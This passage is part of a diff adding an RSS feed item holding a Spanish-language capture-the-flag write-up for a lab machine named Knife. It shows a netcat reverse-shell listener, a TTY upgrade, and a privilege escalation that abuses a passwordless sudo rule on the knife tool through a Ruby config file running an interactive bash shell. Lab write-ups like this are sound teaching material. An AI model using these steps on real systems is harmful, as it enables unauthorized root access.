+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 4242
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;tratamiento-de-la-tty&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;Tratamiento de la tty&lt;/h4&gt;
+
+&lt;p&gt;Una vez que tengamos la reverse shell procedemos a ejecutar&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/stty.jpg&quot; alt=&quot;stty&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Por ultimo exportamos el emulador de la terminal, la shell y adecuamos para que cuadre con la proporcion de la pantalla de nuestra maquina&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;james@knife:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;TERM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;xterm
+james@knife:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;SHELL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;bash
+james@knife:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;stty &lt;/span&gt;rows 45 columns 125
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Para mi caso las filas valen 45 y las columnas 125, para identificar cuales son las proporciones de tu pantalla podrias ejecutar&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;stty&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;           
+speed 38400 baud&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; rows 45&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; columns 125&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; line &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya podemos leer la flag del usuario&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;james@knife:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /home/james/user.txt 
+66bb684b17cf200e47438d902018558e
+james@knife:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;escalada-de-privilegios&quot;&gt;&lt;a href=&quot;#header-1&quot;&gt;&lt;/a&gt;Escalada de privilegios&lt;/h1&gt;
+
+&lt;p&gt;En este punto podriamos aprovecharnos de scripts automatizados como linpeas, pero vamos por lo basico…&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;james@knife:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;james on knife:
+    env_reset, mail_badpass, &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/snap/bin
+
+User james may run the following commands on knife:
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/knife
+james@knife:/&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahaaaa podemos ejecutar el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/knife&lt;/code&gt; como root sin proporcinar nuestra contrasenha de usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;james&lt;/code&gt;, pues a probarlo&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;james@knife:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;knife
+ERROR: You need to pass a sub-command &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;e.g., knife SUB-COMMAND&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+Usage: knife sub-command &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;options&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;--server-url&lt;/span&gt; URL             Chef Infra Server URL.
+        &lt;span class=&quot;nt&quot;&gt;--chef-zero-host&lt;/span&gt; HOST        Host to start Chef Infra Zero on.
+        &lt;span class=&quot;nt&quot;&gt;--chef-zero-port&lt;/span&gt; PORT        Port &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;or port range&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; to start Chef Infra Zero on. Port ranges like 1000,1010 or 8889-9999 will try all given ports &lt;span class=&quot;k&quot;&gt;until &lt;/span&gt;one works.
+    &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;--key&lt;/span&gt; KEY                    Chef Infra Server API client key.
+        &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;no-]color                 Use colored output, defaults to enabled.
+    &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;--config&lt;/span&gt; CONFIG              The configuration file to use.
+        &lt;span class=&quot;nt&quot;&gt;--config-option&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;OPTION&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;VALUE Override a single configuration option.
+        &lt;span class=&quot;nt&quot;&gt;--defaults&lt;/span&gt;                   Accept default values &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;all questions.
+    &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;--disable-editing&lt;/span&gt;            Do not open EDITOR, just accept the data as is.
+    &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;--editor&lt;/span&gt; EDITOR              Set the editor to use &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;interactive commands.
+    &lt;span class=&quot;nt&quot;&gt;-E&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;--environment&lt;/span&gt; ENVIRONMENT    Set the Chef Infra Client environment &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;except &lt;span class=&quot;k&quot;&gt;for in &lt;/span&gt;searches, where this will be flagrantly ignored&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;no-]fips                  Enable FIPS mode.
+    &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;--format&lt;/span&gt; FORMAT              Which format to use &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;output. &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;valid options: &lt;span class=&quot;s1&quot;&gt;'summary'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'text'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'json'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'yaml'&lt;/span&gt;, or &lt;span class=&quot;s1&quot;&gt;'pp'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;no-]listen                Whether a &lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;mode &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; server binds to a port.
+    &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;--local-mode&lt;/span&gt;                 Point knife commands at &lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;repository instead of Chef Infra Server.
+    &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;--user&lt;/span&gt; USER                  Chef Infra Server API client username.
+        &lt;span class=&quot;nt&quot;&gt;--print-after&lt;/span&gt;                Show the data after a destructive operation.
+        &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt; PROFILE            The credentials profile to &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;-V&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;--verbose&lt;/span&gt;                    More verbose output. Use twice &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-VV&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;additional verbosity and three &lt;span class=&quot;nb&quot;&gt;times&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-VVV&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;maximum verbosity.
+    &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;--version&lt;/span&gt;                    Show Chef Infra Client version.
+    &lt;span class=&quot;nt&quot;&gt;-y&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;--yes&lt;/span&gt;                        Say &lt;span class=&quot;nb&quot;&gt;yes &lt;/span&gt;to all prompts &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;confirmation.
+    &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;--help&lt;/span&gt;                       Show this &lt;span class=&quot;nb&quot;&gt;help &lt;/span&gt;message.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Una busqueda rapida para entender a que nos enfrentamos y encontre el siguiente link&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://docs.chef.io/workstation/knife_setup/&quot;&gt;knife_setup&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-c&lt;/code&gt; podemos indicarle la ruta del archivo de configuracion, procedemos a crear un archivo en el directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/james&lt;/code&gt; quedando de la siguiente manera&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;james@knife:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;expl.rb 
+&lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/bin/bash -i&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Con esto solo nos queda ejecutar el comando&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;james@knife:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;knife user list &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; expl.rb 
+root@knife:/home/james# &lt;span class=&quot;nb&quot;&gt;id
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+root@knife:/home/james# &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/root.txt
+94fb18c7c7913defff161e6181f399d4
+root@knife:/home/james# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Y tenemos acceso root y podemos leer la flag!!
+&lt;img src=&quot;assets/celebdark.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Espero que esta guia haya sido de ayuda para tu aprendizaje, estare subiendo mas writeups en los proximos dias :D&lt;/p&gt;
+</description>
+        <pubDate>Thu, 09 Sep 2021 00:00:00 -0400</pubDate>
+        <link>http://localhost:8080//Knife-Page</link>
+        <link href="http://localhost:8080/Knife-Page"/>
+        <guid isPermaLink="true">http://localhost:8080/Knife-Page</guid>
+      </item>
+    
+  </channel>
+</rss>
